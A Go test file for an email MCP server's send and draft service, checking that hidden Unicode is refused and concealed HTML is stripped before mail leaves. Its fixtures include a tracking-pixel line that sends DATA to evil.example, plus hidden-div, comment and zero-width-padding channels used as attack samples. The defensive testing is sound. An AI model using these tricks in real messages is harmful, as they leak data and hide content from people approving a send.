package service

import (
	"bytes"
	"fmt"
	"strings"
	"testing"
	"unicode/utf8"

	"github.com/stretchr/testify/require"

	"github.com/EmadMokhtar/email-mcp-go/internal/audit"
	"github.com/EmadMokhtar/email-mcp-go/internal/confirm"
	"github.com/EmadMokhtar/email-mcp-go/internal/domain/account"
	"github.com/EmadMokhtar/email-mcp-go/internal/domain/mail"
	"github.com/EmadMokhtar/email-mcp-go/internal/mime"
)

const (
	spaceWithNoWidth = "\U0000200B"
	tagLetterA       = "\U000E0041"
	// hiddenHTML holds data in each place that a preview cannot show.
	hiddenHTML = `<p>Thanks, received.</p><img src="https://evil.example/p.gif?d=DATA">` +
		`<div style="display:none">DATA</div><!-- DATA --><p data-x="DATA" style="color:red">Bye.</p>`
)

// sentParts returns the text and the HTML of a built message.
func sentParts(t *testing.T, data []byte) *mime.Parsed {
	t.Helper()
	p, err := mime.ParseMessage(bytes.NewReader(data), 0)
	require.NoError(t, err)
	return p
}

// requireNoHiddenHTML checks that nothing of hiddenHTML left but what is shown.
func requireNoHiddenHTML(t *testing.T, p *mime.Parsed) {
	t.Helper()
	require.NotContains(t, p.HTML, "DATA")
	require.NotContains(t, p.Text, "DATA")
	for _, part := range []string{"<img", "<!--", "<style", "style=", "data-x"} {
		require.NotContains(t, p.HTML, part)
	}
	require.Contains(t, p.HTML, "Thanks, received.")
	text, err := mime.HTMLToText(p.HTML)
	require.NoError(t, err)
	require.Equal(t, text, mime.CleanUntrusted(p.Text), "the text part is the text of the HTML")
}

// A message with text that a confirmation could not show is refused before the
// user is asked, on every path.
func TestSendRefusesHiddenText(t *testing.T) {
	paths := map[string]struct {
		mode   ConfirmMode
		change []func(*account.Account)
	}{
		"in band":         {ConfirmInBand, nil},
		"web page":        {ConfirmFallback, nil},
		"no confirmation": {ConfirmInBand, []func(*account.Account){autonomy}},
	}
	fields := map[string]func(c *mail.Compose){
		"subject":        func(c *mail.Compose) { c.Subject = "Plans" + tagLetterA },
		"body":           func(c *mail.Compose) { c.Body = "See you" + spaceWithNoWidth },
		"a name in to":   func(c *mail.Compose) { c.To = []string{"Bo" + spaceWithNoWidth + "b <bob@example.com>"} },
		"a name in cc":   func(c *mail.Compose) { c.Cc = []string{"Ca" + tagLetterA + "rol <carol@example.com>"} },
		"a name in bcc":  func(c *mail.Compose) { c.Bcc = []string{"Dan" + spaceWithNoWidth + " <dan@example.com>"} },
		"a blank letter": func(c *mail.Compose) { c.Subject = "Plans\U00002800" },
	}
	for pathName, path := range paths {
		for fieldName, set := range fields {
			t.Run(pathName+"/"+fieldName, func(t *testing.T) {
				env := newWriteEnv(t)
				a := env.account(path.change...)
				c := compose("bob@example.com")
				set(&c)

				res, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, path.mode, nil)

				require.ErrorIs(t, err, mime.ErrHiddenText)
				require.True(t, isMessageError(err), "it is an error of the request")
				require.Nil(t, res)
				require.Nil(t, needs)
				env.requireNothingQueued()
				requireEntry(t, env.lastEntry(), "send_message", audit.OutcomeRefused, "invalid_request")
			})
		}
	}
}

// A draft cannot carry what a direct send cannot.
func TestCreateDraftRefusesHiddenText(t *testing.T) {
	env := newWriteEnv(t)
	a := env.account(level(account.MailDraft))
	for _, c := range []mail.Compose{
		{Subject: "Plans" + tagLetterA},
		{Body: "See you" + spaceWithNoWidth},
		{To: []string{"Bo" + spaceWithNoWidth + "b <bob@example.com>"}},
	} {
		_, err := env.svc.CreateDraft(env.ctx(), a.ID, c)
		require.ErrorIs(t, err, mime.ErrHiddenText)
		requireEntry(t, env.lastEntry(), "create_draft", audit.OutcomeRefused, "invalid_request")
	}
	require.Empty(t, env.backend.saved)
}

func TestHTMLIsCleanedBeforeItLeaves(t *testing.T) {
	c := mail.Compose{To: []string{"bob@example.com"}, Subject: "S", HTMLBody: hiddenHTML}

	t.Run("a send that the user confirms", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()

		_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)
		require.NoError(t, err)
		require.Equal(t, "Thanks, received.\n\nBye.", needs.Pending.Preview.BodyStart)
		require.Zero(t, needs.Pending.Preview.BodyMore, "nothing else goes out")

		_, _, err = env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, accept(needs))
		require.NoError(t, err)
		requireNoHiddenHTML(t, sentParts(t, env.sender.sent()[0].Msg.Data))
	})

	t.Run("a send on the web page", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()

		res, _, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmFallback, nil)
		require.NoError(t, err)
		require.NoError(t, env.svc.ApprovePending(env.webCtx(), res.SendID))
		requireNoHiddenHTML(t, sentParts(t, env.sender.sent()[0].Msg.Data))
	})

	t.Run("a send with no confirmation", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account(autonomy, func(a *account.Account) { a.Limits.UndoWindowAuto = 0 })

		_, _, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)
		require.NoError(t, err)
		requireNoHiddenHTML(t, sentParts(t, env.sender.sent()[0].Msg.Data))
	})

	t.Run("a draft", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()

		_, err := env.svc.CreateDraft(env.ctx(), a.ID, c)
		require.NoError(t, err)
		requireNoHiddenHTML(t, sentParts(t, env.backend.saved[0].Data))

		// The saved draft goes out as it is, and the preview shows all of it.
		env.backend.addMessage("d1", env.backend.saved[0].Data, true)
		draft := mail.Ref("d1")
		_, needs, err := env.svc.Send(env.ctx(), a.ID, nil, &draft, ConfirmInBand, nil)
		require.NoError(t, err)
		require.Equal(t, "Thanks, received.\n\nBye.", needs.Pending.Preview.BodyStart)
		require.Zero(t, needs.Pending.Preview.BodyMore)
	})
}

// What the original says is cleaned, not refused, so a reply and a forward work
// for a message with a hidden character.
func TestAReplyAndAForwardOfHiddenTextGoOut(t *testing.T) {
	const hidden = spaceWithNoWidth + tagLetterA
	dirty := func() *mail.Message {
		o := original()
		o.Subject = "Lu" + hidden + "nch"
		o.From = mail.Address{Name: "Ali" + hidden + "ce", Email: "alice@example.com"}
		o.Text = "See" + hidden + " you"
		o.Date = testStart
		return o
	}

	t.Run("a reply", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		env.backend.originals["o1"] = dirty()
		c := mail.Compose{ReplyTo: &mail.ReplyRef{Ref: "o1"}, Body: "Yes."}

		_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)
		require.NoError(t, err)
		require.Equal(t, "Re: Lunch", needs.Pending.Preview.Subject)
		_, _, err = env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, accept(needs))
		require.NoError(t, err)

		data := string(env.sender.sent()[0].Msg.Data)
		require.Contains(t, data, "Subject: Re: Lunch")
		require.Zero(t, mime.HiddenRunes(data))
	})

	t.Run("a forward", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		env.backend.originals["o1"] = dirty()
		ref := mail.Ref("o1")
		c := mail.Compose{ForwardOf: &ref, To: []string{"bob@example.com"}, Body: "FYI"}

		_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)
		require.NoError(t, err)
		require.Equal(t, "Fwd: Lunch", needs.Pending.Preview.Subject)
		require.Zero(t, needs.Pending.Preview.BodyMore)
		_, _, err = env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, accept(needs))
		require.NoError(t, err)

		p := sentParts(t, env.sender.sent()[0].Msg.Data)
		require.Contains(t, p.Text, "See you")
		require.Zero(t, mime.HiddenRunes(p.Text))
	})
}

// A person may write a draft in another mail program, with styles and images.
// It goes out as it was saved. The preview says what it cannot show.
func TestADraftFromAnotherProgramGoesOutAsItWasSaved(t *testing.T) {
	env := newWriteEnv(t)
	a := env.account()
	raw := draftWithHTML(`<p style="color:red">Hello` + spaceWithNoWidth + `</p><img src="https://example.com/logo.png"><!-- note -->`)
	raw = bytes.Replace(raw, []byte("Subject: Two bodies"), []byte("Subject: Two"+spaceWithNoWidth+" bodies"), 1)
	env.backend.addMessage("d1", raw, true)
	draft := mail.Ref("d1")

	_, needs, err := env.svc.Send(env.ctx(), a.ID, nil, &draft, ConfirmInBand, nil)
	require.NoError(t, err)
	require.Equal(t, "Two bodies", needs.Pending.Preview.Subject)
	require.Equal(t, "Hello", needs.Pending.Preview.BodyStart)
	require.Equal(t, 1, needs.Pending.Preview.BodyMore, "the hidden character of the HTML is counted")

	_, _, err = env.svc.Send(env.ctx(), a.ID, nil, &draft, ConfirmInBand, accept(needs))
	require.NoError(t, err)
	require.Equal(t, string(raw), string(env.sender.sent()[0].Msg.Data))
}

// BodyMore says how much of the text that goes out the preview does not show.
func TestPreviewCountsTheRawText(t *testing.T) {
	for name, tc := range map[string]struct {
		body  string
		start string
		more  int
	}{
		"a short text":                  {"Hello", "Hello", 0},
		"a line break at the end":       {"Hello\r\n\r\n", "Hello", 0},
		"a line break at the start":     {"\n\nHello", "Hello", 0},
		"a normal text":                 {"Hello Bob,\n\nSee you.\n", "Hello Bob,\n\nSee you.", 0},
		"padding inside the text":       {"a" + strings.Repeat(" ", 600) + "b", "a b", 599},
		"white space at the end":        {"a" + strings.Repeat(" \t", 50), "a", 100},
		"line breaks inside the text":   {"a" + strings.Repeat("\n", 100) + "b", "a\n\nb", 98},
		"indented lines":                {"a\n    b", "a\nb", 4},
		"text after the preview":        {strings.Repeat("x", 600), strings.Repeat("x", 500), 100},
		"padding after the preview too": {strings.Repeat("x", 600) + "    y", strings.Repeat("x", 500), 100 + 2 + 3},
	} {
		t.Run(name, func(t *testing.T) {
			env := newWriteEnv(t)
			a := env.account()
			c := mail.Compose{To: []string{"bob@example.com"}, Subject: "S", Body: tc.body}

			_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)

			require.NoError(t, err)
			require.Equal(t, tc.start, needs.Pending.Preview.BodyStart)
			require.Equal(t, tc.more, needs.Pending.Preview.BodyMore)
		})
	}
}

// A draft that a person wrote can hold hidden characters. They do not fill the
// preview, and the preview counts them.
func TestDraftPreviewCountsHiddenCharacters(t *testing.T) {
	env := newWriteEnv(t)
	a := env.account()
	text := strings.Repeat(spaceWithNoWidth, 21000) + "Wire the money today."
	raw := strings.Replace(string(draftMail("me@example.com")), "Draft body\r\n", text, 1)
	env.backend.addMessage("d1", []byte(raw), true)
	draft := mail.Ref("d1")

	_, needs, err := env.svc.Send(env.ctx(), a.ID, nil, &draft, ConfirmInBand, nil)

	require.NoError(t, err)
	require.Equal(t, "Wire the money today.", needs.Pending.Preview.BodyStart)
	require.Equal(t, 21000, needs.Pending.Preview.BodyMore)
	require.Equal(t, fmt.Sprintf("… and %d more characters not shown", 21000), needs.Pending.Preview.MoreCharsText())
}

// The preview shows the start of the text. A change further on is still a change
// of the message that the user approved.
func TestAChangeThatThePreviewDoesNotShowIsAChangedMessage(t *testing.T) {
	t.Run("the text of a forward, after the part that is shown", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		first := strings.Repeat("x", 800)
		env.backend.nextOriginal = func(_ mail.Ref, call int) *mail.Message {
			o := original()
			o.Text = first
			if call > 1 {
				o.Text = first[:799] + "y"
			}
			return o
		}
		ref := mail.Ref("o1")
		c := mail.Compose{ForwardOf: &ref, To: []string{"bob@example.com"}, Body: "FYI"}

		_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)
		require.NoError(t, err)
		_, _, err = env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, accept(needs))

		require.ErrorIs(t, err, confirm.ErrPayloadChanged)
		require.Empty(t, env.sender.sent())
	})

	t.Run("a draft, in a part that the preview never shows", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		raw := draftWithHTML(`<p>Hello</p><!-- one -->`)
		env.backend.addMessage("d1", raw, true)
		draft := mail.Ref("d1")

		_, needs, err := env.svc.Send(env.ctx(), a.ID, nil, &draft, ConfirmInBand, nil)
		require.NoError(t, err)
		env.backend.addMessage("d1", bytes.Replace(raw, []byte("one"), []byte("two"), 1), true)
		_, _, err = env.svc.Send(env.ctx(), a.ID, nil, &draft, ConfirmInBand, accept(needs))

		require.ErrorIs(t, err, confirm.ErrPayloadChanged)
		require.Empty(t, env.sender.sent())
	})

	t.Run("the same message gives the same hash", func(t *testing.T) {
		env := newWriteEnv(t)
		a := env.account()
		c := mail.Compose{To: []string{"bob@example.com"}, Subject: "S", HTMLBody: "<p>Hello</p>"}

		_, needs, err := env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, nil)
		require.NoError(t, err)
		require.NotEmpty(t, needs.Pending.Preview.BodyHash)
		require.True(t, utf8.ValidString(needs.Pending.Preview.BodyHash))

		_, _, err = env.svc.Send(env.ctx(), a.ID, &c, nil, ConfirmInBand, accept(needs))
		require.NoError(t, err, "a new Message-ID and a new boundary change nothing")
	})

	require.False(t, samePreview(confirm.Preview{BodyHash: "a"}, confirm.Preview{BodyHash: "b"}))
	require.False(t, samePreview(confirm.Preview{}, confirm.Preview{BodyHash: "b"}), "a stored preview without a hash does not match")
}
